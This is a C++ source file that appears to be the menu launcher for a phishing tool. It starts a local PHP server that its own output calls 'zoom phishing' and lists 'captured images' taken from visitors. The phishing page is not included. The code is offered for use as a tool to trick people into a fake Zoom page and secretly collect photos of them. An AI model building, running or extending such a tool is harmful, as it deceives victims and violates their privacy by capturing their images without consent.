#include<iostream>
#include<string.h>
#include<stdlib.h>
#include<cstdlib>
#include<sstream>
#include<csignal>

using namespace std;

class Messages{
	private:
		int xd;
	public:
		int banner(){
			system("cat ./banner.txt");
			return 0;
		}
		int creator(){
			cout<<"Creator: @DigitalNinja00 @Crow-ui Version : 1.0"<<endl;
			return 0;
		}
};
int function_lear(){
	string lista[] = {"{1} START LISTEN", "{2} LIST PHOTOS","{0} EXIT"};
	size_t hola = sizeof(lista)/sizeof(string);
	for(int i=0;i<hola;i++){
		cout<<lista[i]<<endl;
	}
	return 0;
}
int create_http_server(){
	int puerto;
	cout<<"Write the port for the http server>>> ";cin>>puerto;
	if(puerto>65535 || puerto<1){
		cout<<"Invalid port"<<endl;;
		return 0;
	}
	stringstream var;
	var<<"nohup php -S localhost:"<<puerto<<" -t ./web > /dev/null 2>&1 &";
	system(var.str().c_str());
	cout<<"Server with zoom phishing in port "<<puerto<<endl;
	cout<<"photos saved in the \"web/server directory\""<<endl;;
	cout<<"http://localhost:"<<puerto<<endl;
	return 0;
}
int main(){
	Messages ban;
	Messages* nab = &ban;
	nab->banner();
	Messages cre;
	Messages* erc = &cre;
	erc->creator();
	function_lear();
	while(true){
		int option;
		cout<<"===> ";cin>>option;
		if(option==1){
			create_http_server();
		}else{
			if(option==2){
				system("clear");
				Messages mar;
				Messages* ram = & mar;
				ram->banner();
				cout<<"[*] CAPTURED IMAGES web/server"<<endl;
				system("ls -1 web/server");
				system("sleep 5");
			}else{
				break;
			}
		}
	}
	system("pkill php");
	return 0;
}